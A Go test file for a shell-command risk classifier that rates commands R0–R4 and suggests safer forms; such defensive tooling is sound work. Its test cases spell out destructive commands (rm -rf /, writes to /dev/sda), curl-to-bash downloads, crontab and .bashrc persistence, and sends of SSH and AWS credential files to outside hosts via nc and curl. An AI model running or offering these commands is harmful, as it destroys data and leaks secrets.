package classify

import (
	"encoding/json"
	"strings"
	"testing"
)

func TestEmptyAndUnparsable(t *testing.T) {
	if v := Classify("   "); v.Level != R0 || len(v.Findings) != 0 {
		t.Errorf("blank line: %+v", v)
	}
	v := Classify("echo 'unterminated")
	if v.Level != R2 || len(v.Findings) != 1 || !strings.Contains(v.Findings[0].Reason, "Could not be understood") {
		t.Errorf("unparsable line must be R2 with an explanation: %+v", v)
	}
}

func TestSudoRaisesOneLevelAndCaps(t *testing.T) {
	cases := []struct {
		line string
		want Level
	}{
		{"sudo ls", R0},           // read-only stays read-only
		{"sudo mkdir /opt/x", R2}, // R1 -> R2
		{"sudo rm file", R3},      // R2 -> R3
		{"sudo rm -rf /", R4},     // already R4, must not overflow
		{"sudo dd if=/dev/zero of=/dev/sda", R4},
	}
	for _, c := range cases {
		if got := Classify(c.line).Level; got != c.want {
			t.Errorf("%q = %s, want %s", c.line, got, c.want)
		}
	}
	if r := Classify("sudo rm file").Findings[0].Reason; !strings.Contains(r, "runs as root") {
		t.Errorf("reason should say it runs as root: %q", r)
	}
}

func TestRemoteHostIsNamed(t *testing.T) {
	v := Classify("ssh prod-1 'rm -rf /srv/data'")
	found := false
	for _, f := range v.Findings {
		if f.Level == R3 && strings.HasPrefix(f.Reason, "On remote host prod-1:") {
			found = true
		}
	}
	if !found {
		t.Errorf("remote finding with host name missing: %+v", v.Findings)
	}
}

func TestVerdictIsTheMaxOverAllCommands(t *testing.T) {
	if got := Classify("ls && cp a b && rm -rf build").Level; got != R3 {
		t.Errorf("got %s, want R3 (worst command wins)", got)
	}
	if got := Classify("echo hi; rm -rf /").Level; got != R4 {
		t.Errorf("got %s, want R4 even when hidden after a harmless command", got)
	}
}

func TestDangerHiddenInSubstitutionsAndNesting(t *testing.T) {
	for _, line := range []string{
		"echo $(rm -rf /)",
		"bash -c 'rm -rf /'",
		"sh -c \"sudo rm -rf /\"",
		"echo `rm -rf /`",
		"for f in a b; do rm -rf /; done",
		"if true; then rm -rf /; fi",
		"(cd /tmp; rm -rf /)",
		"eval 'rm -rf /'",
	} {
		if got := Classify(line).Level; got != R4 {
			t.Errorf("%q = %s, want R4", line, got)
		}
	}
}

func TestPipeToShell(t *testing.T) {
	for _, tc := range []struct {
		line string
		want Level
	}{
		{"curl -s https://x.example | bash", R3},
		{"curl -s https://x.example | sudo bash", R4},
		{"wget -qO- https://x.example | sh", R3},
		{"echo aGk= | base64 -d | sh", R3},
		{"bash <(curl -s https://x.example)", R3},
		{"curl -s https://x.example | jq .", R0}, // not an interpreter; fetching to stdout changes nothing
		{"cat script.sh | bash", R1},             // local, visible source
		{"bash script.sh", R1},
	} {
		if got := Classify(tc.line).Level; got != tc.want {
			t.Errorf("%q = %s, want %s", tc.line, got, tc.want)
		}
	}
}

func TestRedirectTargets(t *testing.T) {
	for _, tc := range []struct {
		line string
		want Level
	}{
		{"echo x > /dev/null", R0},
		{"echo x 2> /dev/null", R0},
		{"echo x &> /dev/null", R0},
		{"echo x > /dev/stderr", R0},
		{"echo x >> notes.txt", R1},
		{"echo x > notes.txt", R2},
		{"echo x > /tmp/../etc/passwd", R3},
		{"echo x >> /etc/hosts", R2},
		{"echo x > /dev/sda", R4},
		{"echo x > /dev/mapper/root", R4},
		{"echo 1 > /proc/sys/kernel/panic", R4},
		{"> data.db", R2},
	} {
		if got := Classify(tc.line).Level; got != tc.want {
			t.Errorf("%q = %s, want %s", tc.line, got, tc.want)
		}
	}
}

func TestUnclassifiedCommandsAreReportedOnce(t *testing.T) {
	v := Classify("zzz-tool a && zzz-tool b && ls")
	if v.Level != R1 || len(v.Unclassified) != 1 || v.Unclassified[0] != "zzz-tool" {
		t.Errorf("got level %s unclassified %v", v.Level, v.Unclassified)
	}
	if v := Classify("ls"); len(v.Unclassified) != 0 {
		t.Errorf("known command reported as unclassified: %v", v.Unclassified)
	}
}

func TestAlternativesOnlyForRiskyCommands(t *testing.T) {
	v := Classify("rm -rf build")
	if len(v.Alternatives) == 0 || !strings.HasPrefix(v.Alternatives[0].Command, "trash-put") {
		t.Errorf("rm -rf should suggest trash-put: %+v", v.Alternatives)
	}
	if v := Classify("echo x > a.txt && echo x > a.txt"); len(v.Alternatives) != 1 {
		t.Errorf("identical alternatives must be listed once: %+v", v.Alternatives)
	}
	if v := Classify("git push origin main"); len(v.Alternatives) != 0 {
		t.Errorf("R2 with no safer form should have no alternatives: %+v", v.Alternatives)
	}
}

func TestRedirectAlternativeKeepsTheCommand(t *testing.T) {
	v := Classify("echo hi > notes.txt")
	if len(v.Alternatives) != 1 || v.Alternatives[0].Command != "echo hi >> notes.txt" {
		t.Errorf("alternatives = %+v", v.Alternatives)
	}
	for _, f := range v.Findings {
		if f.Level == R2 && f.Command != "echo hi > notes.txt" {
			t.Errorf("redirect finding should show the full command, got %q", f.Command)
		}
	}
}

func TestForceWithLeaseIsSuggestedForForcePush(t *testing.T) {
	v := Classify("git push --force origin main")
	if len(v.Alternatives) != 1 || v.Alternatives[0].Command != "git push --force-with-lease origin main" {
		t.Errorf("alternatives = %+v", v.Alternatives)
	}
}

func TestLevelStringsAndJSON(t *testing.T) {
	if R3.String() != "R3" || R3.Label() != "Irreversible" {
		t.Errorf("level naming wrong: %s %s", R3, R3.Label())
	}
	b, err := json.Marshal(Classify("rm -rf build"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(b), `"level":"R3"`) {
		t.Errorf("level should marshal as a string: %s", b)
	}
}

func TestRulesNeverPanicOnOddArguments(t *testing.T) {
	for _, line := range []string{
		"rm", "rm -", "rm --", "rm -rf --", "mv", "mv a", "cp", "kill", "git", "git push", "docker", "kubectl",
		"chmod", "dd of=", "find", "psql", "aws", "systemctl", "sudo", "sudo -u", "env", "xargs", "ssh", "ssh -p",
		"terraform", "crontab", "tar", "unzip -", "curl", "rsync",
	} {
		_ = Classify(line)
	}
}

func FuzzClassify(f *testing.F) {
	for _, s := range []string{"rm -rf /", "git push -f", "a | b", "sudo dd of=/dev/sda", "find . -exec rm {} +", "ssh h 'x'", "echo > /etc/x", "psql -c 'DROP TABLE x'"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		v := Classify(s)
		if v.Level < R0 || v.Level > R4 {
			t.Fatalf("level out of range: %d", v.Level)
		}
	})
}

func TestWorkingDirectoryChangesMeaning(t *testing.T) {
	for _, tc := range []struct {
		line string
		want Level
	}{
		{"cd / && rm -rf *", R4},
		{"cd /etc && rm -rf .", R4},
		{"cd ~ && rm -rf *", R4},
		{"cd /var && chmod -R 777 .", R4},
		{"cd / && chmod -R 755 etc", R4}, // resolves to /etc
		{"cd /tmp && rm -rf *", R3},
		{"(cd / && ls); rm -rf *", R3},
		{"cd $X && rm -rf *", R3},
		{"cd /tmp && chmod 777 file", R2}, // the mode is not a path
	} {
		if got := Classify(tc.line).Level; got != tc.want {
			t.Errorf("%q = %s, want %s", tc.line, got, tc.want)
		}
	}
}

func TestDatabaseInputOnStdin(t *testing.T) {
	for _, tc := range []struct {
		line string
		want Level
	}{
		{`echo "DROP TABLE users" | psql`, R3},
		{`psql <<< "DELETE FROM users"`, R3},
		{"psql <<EOF\nTRUNCATE users;\nEOF", R3},
		{`echo "DELETE FROM users WHERE id=1" | psql`, R2},
		{`echo "SELECT 1" | psql`, R0},
	} {
		if got := Classify(tc.line).Level; got != tc.want {
			t.Errorf("%q = %s, want %s", tc.line, got, tc.want)
		}
	}
}

func TestInlineInterpreterCode(t *testing.T) {
	for _, tc := range []struct {
		line string
		want Level
	}{
		{`python3 -c "import shutil; shutil.rmtree('/')"`, R4},
		{`python3 -c "import shutil; shutil.rmtree('/home')"`, R4},
		{`python3 -c "import shutil; shutil.rmtree('build')"`, R3},
		{`python3 -c "import os; os.remove('a')"`, R2},
		{`python3 -c "open('a','w').write('x')"`, R2},
		{`python3 -c "print(1)"`, R2}, // unknown effects: simulate first
		{`python3 script.py`, R1},
		{`sudo python3 -c "import shutil; shutil.rmtree('build')"`, R4},
	} {
		if got := Classify(tc.line).Level; got != tc.want {
			t.Errorf("%q = %s, want %s", tc.line, got, tc.want)
		}
	}
	if v := Classify("python3 script.py"); len(v.Unclassified) != 1 {
		t.Errorf("a script file should be handed to the sandbox as unclassified: %+v", v.Unclassified)
	}
}

func TestGlobalOptionsDoNotHideTheSubcommand(t *testing.T) {
	for _, tc := range []struct {
		line string
		want Level
	}{
		{"git -C /repo reset --hard", R3},
		{"git -C /repo push --force", R3},
		{"git -C /repo clean -fdx", R3},
		{"git -C /repo status", R0},
		{"docker -H tcp://x system prune -af", R3},
		{"docker --context prod volume prune -f", R3},
		{"kubectl -n prod delete ns prod", R3},
		{"kubectl -n prod get pods", R0},
		{"docker --log-level debug system prune -af", R3},
		{"kubectl --server x delete ns y", R3},
		{"git --namespace foo push -f", R3},
	} {
		if got := Classify(tc.line).Level; got != tc.want {
			t.Errorf("%q = %s, want %s", tc.line, got, tc.want)
		}
	}
}

func TestCpAndTeeRateLikeRedirectToTheSameTarget(t *testing.T) {
	for _, tc := range []struct {
		line string
		want Level
	}{
		{"cp /dev/zero /dev/sda", R4},
		{"echo x | tee /dev/sda", R4},
		{"echo 1 | tee /proc/sys/kernel/sysrq", R4},
		{"cp /dev/null /etc/passwd", R3},
		{"echo x | tee /dev/null", R0},
		{"echo x | tee /etc/hosts", R2},
		{"echo x | sudo tee /etc/hosts", R3},
		{"cp /dev/null notes.txt", R2},
		{"echo x | tee -a /etc/hosts", R1},
		{"echo x | tee -a log.txt", R1},
		{"echo x | tee out.txt /dev/null", R2},
		{"echo x | tee", R2},
		{"echo x | tee -a", R1},
		{"cp a /etc/b", R2},
	} {
		if got := Classify(tc.line).Level; got != tc.want {
			t.Errorf("%q = %s, want %s", tc.line, got, tc.want)
		}
	}
}

func TestCommandsThatRunLaterAreRatedLikeWhatTheyHide(t *testing.T) {
	for line, want := range map[string]Level{
		"alias ls='rm -rf ~'":                                           R4,
		"export PROMPT_COMMAND='rm -rf ~'":                              R4,
		"PROMPT_COMMAND+=';rm -rf ~'":                                   R4,
		"trap 'rm -rf ~' EXIT":                                          R4,
		"echo '* * * * * rm -rf ~' | crontab -":                         R4,
		"X=$(rm -rf /)":                                                 R4,
		"export LD_PRELOAD=/tmp/x.so":                                   R2,
		"export LD_LIBRARY_PATH=/tmp/lib":                               R2,
		"export PROMPT_COMMAND='history -a'":                            R2,
		"export PATH=/tmp/x:$PATH":                                      R2,
		"echo 'curl x|sh' >> ~/.bashrc":                                 R3,
		"echo 'rm -rf ~' >> ~/.bashrc":                                  R4,
		"echo 'export PATH=$PATH:~/bin' >> ~/.bashrc":                   R2,
		"(crontab -l; echo '* * * * * rm -rf ~') | crontab -":           R4,
		"crontab -l | { cat; echo '* * * * * rm -rf ~'; } | crontab -":  R4,
		"echo '* * * * * rm -rf ~' | sudo crontab -u root -":            R4,
		"printf '0 3 * * * date\\n* * * * * rm -rf ~\\n' | crontab -":   R4,
		"trap -- 'rm -rf ~' EXIT":                                       R4,
		"PROMPT_COMMAND=('rm -rf ~')":                                   R4,
		"X=$(rm -rf /) ls":                                              R4,
		"alias k=kubectl":                                               R0,
		"alias ls=reboot":                                               R3,
		"alias ls=halt":                                                 R3,
		"alias x=mkfs":                                                  R4,
		"alias gc=mytool":                                               R0,
		"alias x='reboot now'":                                          R3,
		"alias python=python3":                                          R0,
		"alias d=docker":                                                R0,
		"alias rm='rm -i'":                                              R1,
		"alias cp='cp -i'":                                              R1,
		"alias mv='mv -i'":                                              R1,
		"PATH+=:/opt/bin":                                               R0,
		"export PATH+=:/opt/foo/bin":                                    R0,
		"export LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH": R0,
		"export LD_PRELOAD=":                                            R0,
		"export LD_PRELOAD":                                             R0,
		"echo 'export A=1' >> ~/.zshrc":                                 R2,
		"echo 'x' | tee -a ~/.profile":                                  R2,
		"cat extra.sh >> /etc/profile.d/extra.sh":                       R2,
		"alias ll='ls -l'":                                              R0,
		"trap - EXIT":                                                   R1,
		"trap 'rm -f /tmp/lock' EXIT":                                   R2,
		"export PATH=$HOME/bin:$PATH":                                   R0,
		"export PATH=$PATH:/tmp/x":                                      R0,
		"export EDITOR=vim":                                             R0,
		"FOO=bar":                                                       R0,
		"echo '0 3 * * * tar czf b.tgz d' | crontab -":                  R1,
		"echo hi >> ~/notes.txt":                                        R1,
	} {
		if got := Classify(line).Level; got != want {
			t.Errorf("%q = %s, want %s", line, got, want)
		}
	}
}

// A cd inside deferred code or a substitution runs elsewhere and must not
// change how the next command on the line is rated.
func TestDeferredCdDoesNotChangeLaterCommands(t *testing.T) {
	want := Classify("rm -rf usr")
	for _, line := range []string{
		"alias up='cd /'; rm -rf usr",
		"export X=$(cd / && pwd); rm -rf usr",
		"trap 'cd /' EXIT; rm -rf usr",
	} {
		got := Classify(line)
		if got.Level != want.Level || got.Findings[len(got.Findings)-1].Command != "rm -rf usr" {
			t.Errorf("%q = %s %+v, want like plain rm -rf usr (%s)", line, got.Level, got.Findings, want.Level)
		}
	}
}

func TestBareAssignmentIsReportedAsTyped(t *testing.T) {
	if got := Classify("FOO=bar").Findings[0].Command; got != "FOO=bar" {
		t.Errorf("reported as %q", got)
	}
}

func TestSendingSecretFilesIsR3(t *testing.T) {
	for line, want := range map[string]Level{
		"cat ~/.ssh/id_rsa | nc example.com 80":    R3,
		"curl -d @~/.aws/credentials https://x.io": R3,
		"scp ~/.ssh/id_ed25519 host:":              R3,
		"nc host 80 < ~/.gnupg/secring.gpg":        R3,
		"scp report.pdf host:":                     R1,
		"cat ~/.ssh/id_rsa.pub | nc host 80":       R1,
		"nc -l 8080":                               R1,
	} {
		if got := Classify(line).Level; got != want {
			t.Errorf("%q = %s, want %s", line, got, want)
		}
	}
}
